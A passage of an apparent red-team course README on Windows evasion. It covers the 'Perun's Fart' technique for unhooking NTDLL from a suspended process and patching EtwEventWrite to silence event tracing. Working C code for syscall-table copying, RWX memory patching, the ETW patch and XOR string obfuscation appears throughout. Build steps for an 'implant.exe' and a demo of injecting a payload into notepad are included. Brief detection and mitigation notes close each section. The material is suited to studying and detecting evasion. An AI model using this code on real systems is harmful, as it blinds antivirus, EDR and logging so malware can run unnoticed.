### Step 4: Unhook Current Process NTDLL

Now we use the clean copy to unhook our own NTDLL:

```c
ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
```

## The Unhooking Process

### Finding the Syscall Table

The key challenge is identifying which parts of NTDLL contain the syscall stubs that need to be restored. The implementation uses two critical functions:

#### Find First Syscall

This function locates the beginning of the syscall table by searching for characteristic patterns:

```c
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
    // ... setup code ...
    
    // copy clean "syscall table" into ntdll memory
    DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
    DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
    
    if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
        DWORD SC_size = SC_end - SC_start;
        // ... copy the syscall table ...
    }
    // ... rest of function ...
}
```


#### Find Last Syscall

Similarly, this function finds the end of the syscall table:

```c
int FindLastSysCall(char * pMem, DWORD size) {

    // returns the last byte of the last syscall
    DWORD i;
    DWORD offset = 0;
    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
    
    // backwards lookup
    for (i = size - 9; i > 0; i--) {
        if (!memcmp(pMem + i, pattern, 9)) {
            offset = i + 6;
            printf("Last syscall byte found at 0x%p\n", pMem + offset);
            break;
        }
    }		
    
    return offset;
}
```

The part responsible for finding the syscall table is the **`UnhookNtdll()` function** which calls two helper functions:

## Main Function - `UnhookNtdll()`:
```c
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
    // ... setup code ...
    
    // copy clean "syscall table" into ntdll memory
    DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
    DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
    
    if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
        DWORD SC_size = SC_end - SC_start;
        // ... copy the syscall table ...
    }
    // ... rest of function ...
}
```

**Helper Function 1 - `FindFirstSyscall()`:**
Finds the **beginning** of the syscall table by searching for:
- `\x0f\x05\xc3` (syscall + ret instructions)
- Then backtracks to find `\xcc\xcc\xcc` (int3 padding) which marks the start

**Helper Function 2 - `FindLastSysCall()`:**
Finds the **end** of the syscall table by searching backwards for:
- `\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc` (syscall + ret + int 2e + ret + int3 padding)

**The Complete Syscall Table Location Process:**
1. **`UnhookNtdll()`** orchestrates the process
2. **`FindFirstSyscall()`** locates the start offset  
3. **`FindLastSysCall()`** locates the end offset
4. **`SC_end - SC_start`** calculates the size of the syscall table region
5. **`memcpy()`** copies this region from clean NTDLL to hooked NTDLL

So **`UnhookNtdll()` is the main function responsible** for finding and copying the syscall table, using the two pattern-matching helper functions to identify the boundaries.


### Debugger Analysis: Syscall Table Patterns

<img width="1610" height="801" alt="image" src="https://github.com/user-attachments/assets/5fcc1ab8-80e8-44bd-8edf-f5f728d59fcd" />

Let's examine these patterns in a debugger:

```batch
Debugger -> Attach -> notepad.exe

Symbols -> Search -> NtAccessCheck
```

1. **First Syscall Pattern**:
   - Search for `0F 05 C3` (syscall; ret)
   - Move backward to find `xcc xcc xcc` (INT3 padding)
   - This marks the beginning of the syscall table

2. **Last Syscall Pattern**: 
   - Search for `0F 05 C3 CD` (syscall; ret; int)
   - This marks the end boundary of the syscall table

 0F05:
 
<img width="1685" height="817" alt="image" src="https://github.com/user-attachments/assets/46691277-ca4f-401d-8910-c1d04ab29dac" />

Once 0F05 is found we go up until we see CC bytes:

<img width="1684" height="821" alt="image" src="https://github.com/user-attachments/assets/42a36b57-f7d1-478f-a0a2-07ae0fbb21aa" />

If it's found we know that this address is the first byte of the first syscall:

<img width="1675" height="425" alt="image" src="https://github.com/user-attachments/assets/a8305c82-f416-4c54-8eac-14d7e86be59d" />

The second function works similarly but this time were going from the end of ANTDLL and looking this pattern:

```batch
\x0f\x05\xc3...
```

<img width="1686" height="595" alt="image" src="https://github.com/user-attachments/assets/59c900e3-41fd-4bde-a697-d7339892d509" />

On the debugger, if we scroll below we will see the end of the syscall table which looks like this:

<img width="1685" height="810" alt="image" src="https://github.com/user-attachments/assets/0e632e7d-a0cb-4c78-8eae-e6ebce93435a" />



### Memory Protection and Copy Process

Once we have the syscall table boundaries `DWORD SC_start` & `DWORD SC_end`, we calculate the size of it `DWORD SC_size` and crate a copy ` memcpy`. Then finally adjust the protection `oldprotect`:

```c
// prepare ntdll.dll memory region for write permissions.
VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,  // <-- CHANGE TO RWX
                &oldprotect);
if (!oldprotect) {
    // RWX failed!
    return -1;
}

// copy clean "syscall table" into ntdll memory
DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);

if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
    DWORD SC_size = SC_end - SC_start;
    printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
    printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
    printf("size: %i\n", SC_size);
    getchar();
    memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),        // DEST: hooked ntdll
            (LPVOID)((DWORD_PTR) pCache + SC_start),        // SRC: clean ntdll copy
            SC_size);                                       // SIZE: syscall table region
}

// restore original protection settings of ntdll
VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect,        // <-- RESTORE original protection
                &oldprotect);
```

## Practical Demonstration

### Step 1: Compile and Run

```batch
cd 05.PerunsFart
compile.bat
```

Copy the `implant.exe` to test environment folder and rename it as `perun.exe`.

Run `perun.exe`

Attach on Debugger:

<img width="1684" height="809" alt="image" src="https://github.com/user-attachments/assets/a17f936b-e730-4fae-8067-ca9bb82d0fb4" />

msbuild PerunsFart.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"

### Step 2: Observe Process Creation

When running the executable:
1. A new `cmd.exe` process is created in suspended state
   <img width="1678" height="833" alt="image" src="https://github.com/user-attachments/assets/1382e546-208a-46be-beb3-6310cdb85d7c" />
   
3. The main thread remains suspended, blocking AV injection
   <img width="1059" height="774" alt="image" src="https://github.com/user-attachments/assets/854bc8a7-3617-48e7-8b70-29589b7f0bba" />

5. Clean NTDLL is extracted from this process
   Cache address:
   <img width="1684" height="379" alt="image" src="https://github.com/user-attachments/assets/891c235d-5988-4840-9784-cdd749c0fa87" />

   CTRL+G and paste:
   <img width="1680" height="816" alt="image" src="https://github.com/user-attachments/assets/b6f2620f-4d01-4836-81bc-095d0d7372b1" />
   
7. The suspended process is terminated
   <img width="1685" height="695" alt="image" src="https://github.com/user-attachments/assets/82d942a9-f21d-4e6d-889d-8eff3a5a0c61" />
   <img width="1685" height="570" alt="image" src="https://github.com/user-attachments/assets/32121675-310d-48f2-86ff-fd19ecf7363b" />


### Step 3: Verify Unhooking

Were entering the unhookig functions: 

<img width="1375" height="137" alt="image" src="https://github.com/user-attachments/assets/bdb1991f-73dc-4f36-a04f-45c492459bbe" />

First syscall has been found here: 

<img width="1615" height="518" alt="image" src="https://github.com/user-attachments/assets/3ab35293-d56e-4d9a-8436-72fb52a7945b" />

CTRL+G and paste:

<img width="705" height="187" alt="image" src="https://github.com/user-attachments/assets/33aa705a-29bb-4333-956e-3b52f5859263" />

<img width="1607" height="792" alt="image" src="https://github.com/user-attachments/assets/d0e8c845-2160-4a80-b100-ef41b2aa7adb" />


The second one (Last syscall byte found):

<img width="1613" height="540" alt="image" src="https://github.com/user-attachments/assets/97265cdb-0f08-49b9-8c60-80078ccdab79" />

<img width="1617" height="658" alt="image" src="https://github.com/user-attachments/assets/4418095e-01c0-477f-b161-5c334e66c9a5" />


**Before Unhooking:**
- `NtCreateThreadEx` shows hooks (starting with `E9` jump instructions)
- Characteristic syscall bytes are replaced
 
**After Unhooking:**
- `NtCreateThreadEx` shows clean syscall stub (`4C 8B D1 B8 ...`)
- All hooked functions are restored to their original state

<img width="1605" height="787" alt="image" src="https://github.com/user-attachments/assets/0852e6ff-434c-4383-8990-7b746344da2a" />

<img width="1608" height="793" alt="image" src="https://github.com/user-attachments/assets/901020fe-7d32-4e92-afdf-3819e8e107ce" />

### Step 4: Execute Payload

Once unhooking is complete:
- The process can proceed with injection or other operations
- All NTDLL functions work without AV interference
- The message box payload executes successfully in the target process

If we hit enter on the cmd and re-analyze:

<img width="1617" height="798" alt="image" src="https://github.com/user-attachments/assets/9836b037-18fd-4ee0-8822-2c51eb79aefe" />

<img width="1607" height="793" alt="image" src="https://github.com/user-attachments/assets/63a8f663-b9fc-4d46-9dd7-40941cf521b8" />

The hook is gone:

<img width="1613" height="780" alt="image" src="https://github.com/user-attachments/assets/655b9e43-ecf2-4bbb-b50f-e2086ee41cfe" />

We can start our notepad.exe, and hit enter on the cmd once more, our code gets injected into our notepad: 

<img width="1363" height="792" alt="image" src="https://github.com/user-attachments/assets/86c9777f-87f2-4ab3-b434-ddee9c91f853" />

## Technical Considerations

### Advantages

1. **No Disk I/O**: Avoids suspicious file reading operations
2. **No Version Dependency**: Works regardless of Windows version
3. **Minimal Footprint**: Temporary process is quickly terminated
4. **Comprehensive Unhooking**: Restores entire syscall table

### Limitations

1. **Process Creation**: May be monitored by advanced EDR solutions
2. **Suspended Process Detection**: Some security products may flag suspended processes
3. **Memory Patterns**: Syscall table patterns may change in future Windows versions

### Detection Avoidance

The technique minimizes detection risk by:
- Using legitimate Windows processes (cmd.exe)
- Quickly terminating the suspended process
- Avoiding disk operations
- Operating entirely in memory

## Comparison with Other Techniques

| Technique | Source of Clean NTDLL | Disk I/O | Complexity |
|-----------|----------------------|----------|------------|
| **Disk Reading** | File system | Yes | Low |
| **Hell's Gate** | N/A (dynamic resolution) | No | Medium |
| **Halo's Gate** | N/A (neighbor inference) | No | High |
| **Perun's Fart** | Suspended process | No | Medium |

## Name Origin

The technique's name "Perun's Fart" comes from a word play:
- "Fart" in Polish means "luck"
- The technique relies on fortunate timing in process creation
- Perun is a Slavic god of thunder, symbolizing the powerful but subtle nature of the technique

## Security Implications

### Defensive Applications
- Red team operations against monitored environments
- Security product testing and evasion research
- Malware analysis and detection development

### Detection Opportunities
- Monitoring for processes created with `CREATE_SUSPENDED` flag
- Detecting rapid process creation and termination
- Analyzing memory patching patterns in NTDLL

## Conclusion

Perun's Fart provides an elegant solution to the NTDLL unhooking problem by leveraging Windows' own process creation mechanics. Instead of fighting against security hooks or relying on complex inference algorithms, it simply accesses clean NTDLL from a source that hasn't been contaminated yet—a newly created suspended process.

This technique demonstrates sophisticated understanding of Windows internals and process timing, offering a reliable method for security researchers to operate in hooked environments without triggering disk-based detection mechanisms.

</details>


<details>
<summary>07 - Silencing Process Event Tracing</summary>

## Overview

Event Tracing for Windows (ETW) is a powerful kernel-level tracing facility that provides detailed monitoring of application and operating system events. This repository demonstrates techniques for bypassing ETW monitoring by patching critical functions in memory, specifically targeting the `EtwEventWrite` function in ntdll.dll.

<img width="919" height="888" alt="image" src="https://github.com/user-attachments/assets/c09919b9-fdf0-44ec-b875-901686ff8498" />

## ETW Architecture Overview

[02.Non-admin/02.SilenceETW](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/02.SilenceETW)

ETW consists of three main components:

- **Event Providers**: Components that generate events (applications, drivers, system components)
- **Event Controllers**: Manage tracing sessions and configure providers  
- **Event Consumers**: Applications that read and process event data

ETW operates as a "best-effort" framework that can capture detailed system information including:
- Process creation and command-line arguments
- Network activity and DNS queries
- WMI execution details
- .NET runtime events
- Parent process ID information

## Step-by-Step Demonstration

### Step 1: Compile the Demonstration Code

Open **x64 Native Tools Command Prompt for VS** and execute:

```batch
cd 02.SilenceETW
compile.bat
```

The demonstration code performs the following:
1. Unhooks NTDLL using fresh copy from disk
2. Loads CLR (Common Language Runtime) into the process
3. Initializes .NET runtime using COM interfaces
4. Generates extensive ETW events during CLR initialization

### Step 2: Understanding ETW Capabilities

ETW provides comprehensive monitoring capabilities that make it the "monitoring bloodstream of Windows." It captures more thorough, detailed, and timely data than other Windows logging facilities.

**Key ETW Functions:**
- `EventRegister` - Register an event provider
- `EventWrite` - Write events to a trace session
- `EventUnregister` - Unregister an event provider
- `EtwEventWrite` - Core function for writing ETW events (primary target for patching)

### Step 3: Capturing ETW Events Without Patching

#### Start ETW Logging Session

Open an elevated command prompt and execute the commands from `logman.cmds.txt`:

 <img width="958" height="273" alt="image" src="https://github.com/user-attachments/assets/2161f51d-d7aa-4c1c-8cba-b0d7e62956c9" />
 
```batch
# Start ETW session for CLR Runtime events
logman start clrevents -p Microsoft-Windows-DotNETRuntime 0x1CCBD 0x5 -ets -ct perf
```

<img width="194" height="414" alt="image" src="https://github.com/user-attachments/assets/9713195b-a8fc-4fef-b32d-85da02748691" />


**Command Explanation:**
- `logman start clrevents` - Start a session named "clrevents"
- `-p Microsoft-Windows-DotNETRuntime` - Monitor .NET Runtime provider
- `0x1CCBD 0x5` - Keywords and level for event filtering
- `-ets` - Execute command immediately
- `-ct perf` - Use performance counter for timing

**Note:** Administrative privileges are required for logman operations.

#### Run the Unpatched Application

Execute the compiled CLR loader without ETW patching:

```batch
implant.exe
```

<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/c6286ca0-62ce-44a8-9722-85e0e5f1fa52" />

<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/5618bade-a682-4b34-9ff1-fee1777565aa" />

The application will:
- Display its Process ID
- Load clr.dll into the process
- Initialize the .NET runtime
- Generate extensive ETW events
- Pause for user input between stages

#### Stop ETW Logging and Generate Report

```batch
# Stop the ETW session
logman stop clrevents -ets

# copy and rename it as clrevents1.et1
move clrevents.et1 clrevents1.et1

# Convert binary ETL file to readable format
tracerpt clrevents1.etl
``` 

<img width="1609" height="800" alt="image" src="https://github.com/user-attachments/assets/0e4b305f-388e-4c6b-aaf3-367f2be69149" />
<img width="1611" height="799" alt="image" src="https://github.com/user-attachments/assets/11633930-2a0b-420e-99f8-6da35c674d24" />


<img width="367" height="269" alt="image" src="https://github.com/user-attachments/assets/59b29d2e-32ae-43d6-99ee-cae34b1acd75" />

#### Analyze Captured Events

Examine the generated XML file to observe the extensive ETW data. You should see numerous CLR-related events including:

- Runtime startup events
- AppDomain creation events  
- Thread creation events
- Assembly loading events
- JIT compilation events
- Garbage collection events

`dumpfile.xml`:

Let's take the process ID of our implant when it was running: 
<img width="690" height="426" alt="image" src="https://github.com/user-attachments/assets/8fba229c-d310-4e92-bb4f-e56237014b25" />

So let's search any events which are related to our process.

Search for 3824:
<img width="1608" height="803" alt="image" src="https://github.com/user-attachments/assets/90d41ba2-4f16-4157-848e-437122b82ae9" />

First event we have the start of the runtime, so CLR DLL was loaded. 

<img width="1604" height="796" alt="image" src="https://github.com/user-attachments/assets/3cebeb61-6ef0-40d2-9305-bbfe6cfe3c56" />

Then new app domain was loaded:

<img width="1612" height="795" alt="image" src="https://github.com/user-attachments/assets/fefadedf-2e22-4978-9a27-4929baf94112" />

Then new thread was created:

<img width="1608" height="801" alt="image" src="https://github.com/user-attachments/assets/dda1e299-18a9-4aa7-bf28-aee18b3b765c" />

Some segment:

<img width="1609" height="797" alt="image" src="https://github.com/user-attachments/assets/ca57f6c8-0dc8-44eb-ad53-bfbc1e8815ab" />

As you can see a lot of logs related to our process has been captured. This is a clear example of how ETW is powerful.


All right, so what we can do about it is first of all the process which wants to log its activity using ETW, it will utilize several API functions from `ntdll`, these are ETW related and what we can do from our perspective is we can patch them, because it's utilizing `NTDLL` from the process memory of our process, which we control completely. So what we can do, we can patch those functions specifically as an example, we can patch ETW event write function from `ntdll`. 

### Step 4: Implementing ETW Patching

#### The ETW Patching Function

The core patching mechanism is implemented in the `DisableETW()` function:

```cpp
int DisableETW(void) {
    DWORD oldprotect = 0;
    
    // Locate EtwEventWrite function in ntdll
    unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
    void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
    
    // Change memory protection to allow writing
    VirtualProtect(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

    // Apply architecture-specific patch
#ifdef _WIN64
    // x64 patch: xor rax, rax; ret
    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);
#else
    // x86 patch: xor eax, eax; ret 14
    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);
#endif

    // Restore original memory protection
    VirtualProtect(pEventWrite, 4096, oldprotect, &oldprotect);
    FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
    
    return 0;
}
```

#### Patch Mechanism Explained

**Before Patching:**
```asm
EtwEventWrite:
; Complex event writing logic
mov     rcx, [rsp+8]
mov     rax, rcx
; ... extensive event processing ...
ret
```

**After Patching (x64):**
```asm
EtwEventWrite:
xor rax, rax  ; Immediately return success (0)
ret           ; Skip all event writing logic
```

**After Patching (x86):**
```asm
EtwEventWrite:
xor eax, eax  ; Zero out eax (return value)
ret 14        ; Return and clean stack
```

### Step 5: Testing with ETW Patching Enabled

#### Modify the Code

Uncomment the `DisableETW()` function call in the main function:

```cpp
int main(void) {
    // ... existing code ...
    
    printf("PID: %d\n", GetCurrentProcessId());
    printf("Before disabling ETW\n"); 
    getchar();

    // Enable ETW patching
    DisableETW();
    
    LoadLibrary("clr.dll");
    SummonCLR();
    
    printf("After disabling ETW\n"); 
    getchar();	

    return 0;
}
```

#### Recompile and Test

1. **Recompile the application** with ETW patching enabled:
   ```batch
   compile.bat
   ```

Before we turn on the logging again, let's rename `dumpfile.xml` to `dumpfile1.xml`, `summary.txt` to `summary1.txt`.


2. **Start ETW logging session on the second cmd**:
   ```batch
   logman start clrevents -p Microsoft-Windows-DotNETRuntime 0x1CCBD 0x5 -ets -ct perf
   ```

3. **Run the patched application**:
   ```batch
   implant.exe
   ```

   <img width="1610" height="798" alt="image" src="https://github.com/user-attachments/assets/2e1d6197-a16d-4173-bf55-0e56018169b3" />


4. **Stop ETW logging** and generate report:
   ```batch
   logman stop clrevents -ets

   # change name
   move clrevents.etl clrevents2.etl
   
   tracerpt clrevents2.etl
   ```

   On File Explorer rename the `dumpfile.xml` to `dumpfile2.xml`:

   <img width="347" height="377" alt="image" src="https://github.com/user-attachments/assets/256c9ae3-3422-4a47-86ec-9a345c50b4e5" />


#### Expected Results

- PID: 6052
  <img width="815" height="400" alt="image" src="https://github.com/user-attachments/assets/897adfeb-4496-4d48-a9fe-0e6888424596" />
  
After applying the ETW patch:
- The application should run normally
- CLR should load and initialize successfully
- **No CLR-related ETW events** should appear in the logs
  <img width="1692" height="829" alt="image" src="https://github.com/user-attachments/assets/3caf53c9-fb6e-4e4b-95ab-ab105397db7f" />
  
- Only system-level events from other processes may be captured
- Compare `clr_events.xml` (without patch) vs `clr_events_patched.xml` (with patch)



### Step 6: Debugger Analysis

#### Attach Debugger for Verification

1. **Run the patched application again on cmd `implant.exe`**
2. **Attach debugger** x64dbg to the process
   <img width="1093" height="601" alt="image" src="https://github.com/user-attachments/assets/f1fa1587-c4b6-455e-9c1b-241f903da62d" />

4. **Examine the EtwEventWrite function** in ntdll.dll
   <img width="1677" height="809" alt="image" src="https://github.com/user-attachments/assets/35a86de6-b665-4ae5-99c8-71f3bfe91030" />

#### Expected Debugger Output

This is the beginning of the function:
<img width="1687" height="816" alt="image" src="https://github.com/user-attachments/assets/7e29ad5f-4c15-454b-9bc5-fc4418e3dc5f" />

Click on the blue arrow to continue, go back on cmd and hit `enter` and the `CLR` should be loaded:
<img width="1681" height="832" alt="image" src="https://github.com/user-attachments/assets/b33a65f7-251d-4d54-9128-0bfe03145d75" />


**After Patching (x64):**

Now you can see the patch:
<img width="1683" height="540" alt="image" src="https://github.com/user-attachments/assets/bb7441fc-32a1-4e55-9b08-40874dcfbd16" />


## Technical Implementation Details

### Core Components

#### 1. ETW Patching (`DisableETW`)

The primary function that patches `EtwEventWrite` to prevent event generation.

#### 2. NTDLL Unhooking (`UnhookNtdll`)

Ensures clean NTDLL copy is used before applying ETW patches:

```cpp
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    // Parse PE headers and copy clean .text section
    // Overwrites any existing hooks in the current process
}
```

#### 3. CLR Loading (`SummonCLR`)

Demonstrates ETW event generation by loading .NET runtime:

```cpp
int SummonCLR(void) {
    // Uses COM interfaces to initialize CLR
    // Generates extensive ETW events during initialization
}
```

### XOR Encryption Utility

```cpp
void XORcrypt(char str2xor[], size_t len, char key) {
    for (int i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}
```

Used for string obfuscation to avoid static detection.

## Building the Project

### Prerequisites

- Visual Studio 2019 or later with C++ tools
- Windows SDK
- x64 Native Tools Command Prompt

### Compilation

Use the provided `compile.bat` script:

```batch
compile.bat
```

This batch file handles the compilation process for the implant.

## Detection and Mitigation

### Detection Opportunities

- Memory protection changes on ntdll functions
- ETW event gaps or abnormal silence
- Function hooking detection in security products
- Behavioral analysis of patching patterns

### Defensive Considerations

- Monitor `VirtualProtect` calls targeting system DLLs
- Implement checksum validation for critical functions
- Use tamper protection mechanisms
- Deploy behavioral detection for ETW suppression

## Limitations

- Patch is process-specific and must be applied per-process
- May be detected by advanced EDR solutions
- Only affects user-mode ETW providers
- Requires code execution in target process

## References

- [Microsoft ETW Documentation](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal)
- [Controlling .NET Framework Logging](https://docs.microsoft.com/en-us/dotnet/framework/performance/controlling-logging)
- [Windows Internals, 7th Edition](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)


</details>
